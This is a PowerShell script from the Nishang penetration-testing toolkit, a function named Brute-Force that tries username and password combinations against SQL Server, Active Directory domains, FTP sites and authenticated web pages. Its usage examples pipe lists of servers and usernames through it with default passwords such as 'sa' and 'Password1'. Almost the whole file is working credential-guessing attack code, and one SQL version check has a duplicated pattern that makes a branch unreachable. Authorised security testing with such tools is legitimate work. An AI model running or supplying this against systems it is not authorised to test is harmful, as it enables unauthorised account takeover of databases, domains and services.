
<#
.SYNOPSIS
Nishang payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.

.DESCRIPTION
This payload tries to login to SQL, ActiveDirectory, Web or FTP using a specific account and password.
You can also specify a password-list as input as shown in the Example section.

.PARAMETER Identity
Specifies a SQL Server, FTP Site or Web Site.

.PARAMETER UserName
Specifies a UserName. If blank, trusted connection will be used for SQL and anonymous access will be used for FTP.

.PARAMETER Password
Specifies a Password.

.PARAMETER Service
Enter a Service. Default service is set to SQL.

.EXAMPLE
PS > Brute-Force -Identity SRV01 -UserName sa -Password ""

.EXAMPLE
PS > Brute-Force -Identity ftp://SRV01 -UserName sa -Password "" -Service FTP

.EXAMPLE
 PS > "SRV01","SRV02","SRV03" | Brute-Force -UserName sa -Password sa

.EXAMPLE
 PS > Import-CSV .\username.txt | Brute-Force -Identity “targetdomain“ -Password Password1 -Service ActiveDirectory 


.EXAMPLE
PS > Brute-Force -Identity "http://www.something.com" -UserName user001 -Password Password1 -Service Web

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/03/use-powershell-to-security-test-sql-server-and-sharepoint.aspx
https://github.com/samratashok/nishang

.NOTES
Goude 2012, TreuSec
#>

  
  function Brute-Force {
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLineByPropertyName = $true)]
        [Alias("PSComputerName","CN","MachineName","IP","IPAddress","ComputerName","Url","Ftp","Domain","DistinguishedName")]
        [string]
        $Identity,

        [parameter(Position = 1, ValueFromPipeLineByPropertyName = $true)]
        [string]
        $UserName,

        [parameter(Position = 2, ValueFromPipeLineByPropertyName = $true)]
        [string]
        $Password,

        [parameter(Position = 3)] [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
        [string]
        $Service = "SQL"
    )
  Process {
    if($service -eq "SQL") {
      $Connection = New-Object System.Data.SQLClient.SQLConnection
      if($userName) {
        $Connection.ConnectionString = "Data Source=$identity;Initial Catalog=Master;User Id=$userName;Password=$password;"
      } else {
        $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
      }
      Try {
        $Connection.Open()
        $success = $true
      }
      Catch {
        $success = $false
      }
      if($success -eq $true) {
        $message = switch($connection.ServerVersion) {
          { $_ -match "^6" } { "SQL Server 6.5";Break }
          { $_ -match "^6" } { "SQL Server 7";Break }
          { $_ -match "^8" } { "SQL Server 2000";Break }
          { $_ -match "^9" } { "SQL Server 2005";Break }
          { $_ -match "^10\.00" } { "SQL Server 2008";Break }
          { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break }
          Default { "Unknown" }
        }
      } else {
        $message = "Unknown"
      }
    } elseif($service -eq "FTP") {
      if($identity -notMatch "^ftp://") {
        $source = "ftp://" + $identity
      } else {
        $source = $identity
      }
      try {
        $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
        $result = $ftpRequest.GetResponse()
        $message = $result.BannerMessage + $result.WelcomeMessage
        $success = $true
      } catch {
        $message = $error[0].ToString()
        $success = $false
      }
    } elseif($service -eq "ActiveDirectory") {
      Add-Type -AssemblyName System.DirectoryServices.AccountManagement
      $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
      Try {
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $identity)
        $success = $true
      }
      Catch {
        $message = "Unable to contact Domain"
        $success = $false
      }
      if($success -ne $false) {
        Try {
          $success = $principalContext.ValidateCredentials($username, $password)
          $message = "Password Match"
        }
        Catch {
          $success = $false
          $message = "Password doesn't match"
        }
      }
    } elseif($service -eq "Web") {
      if($identity -notMatch "^(http|https)://") {
        $source = "http://" + $identity
      } else {
        $source = $identity
      }
      $webClient = New-Object Net.WebClient
      $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
      $webClient.Credentials = $credential
      Try {
        $message = $webClient.DownloadString($source)
        $success = $true
      }
      Catch {
        $success = $false
        $message = "Password doesn't match"
      }
    }
    # Return Object
    New-Object PSObject -Property @{
      ComputerName = $identity;
      UserName = $username;
      Password = $Password;
      Success = $success;
      Message = $message
    } | Select-Object Success, Message, UserName, Password, ComputerName
  }
}

